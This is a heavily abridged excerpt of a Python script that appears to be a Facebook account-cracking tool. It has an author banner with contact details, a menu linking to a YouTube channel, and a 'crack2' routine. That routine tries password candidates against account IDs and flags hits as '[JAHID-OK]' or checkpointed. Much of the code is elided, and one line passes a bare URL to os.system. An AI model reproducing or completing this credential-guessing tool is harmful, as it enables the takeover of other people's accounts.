...
\x1b[92;1m===================================>\x1b[92;1m
\x1b[93;1m Author       \x1b[92;1m=>      \x1b[93;1mJahid Khan
\x1b[93;1m Whatsapp     \x1b[92;1m=>      \x1b[93;1m+8801619105220
\x1b[93;1m Facebook        \x1b[92;1m=>      \x1b[93;1mRex  Xahid (film maker)
\x1b[92;1m===================================>\x1b[92;1m
"""%(h))
...
def menu(): #Bilo
	...
	if farhan in ['1','01']:
		...
		os.system("xdg-open https://youtube.com/c/Jahid Photographs")
		exit()
	else:
		os.system("https://youtube.com/c/Jahid Photographs")
		exit()
...
def crack2(idf,pwv):
	...
	fff = '%'
	print('\r%s [JAHID] %s/%s  OK*%s | CP*%s => %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "www.facebook.com" in resp.json()["error_msg"]:
				if 'ya' in oprek:
					...
					print('\r%s [JAHID-OK] %s|%s        '%(b,idf,pw))
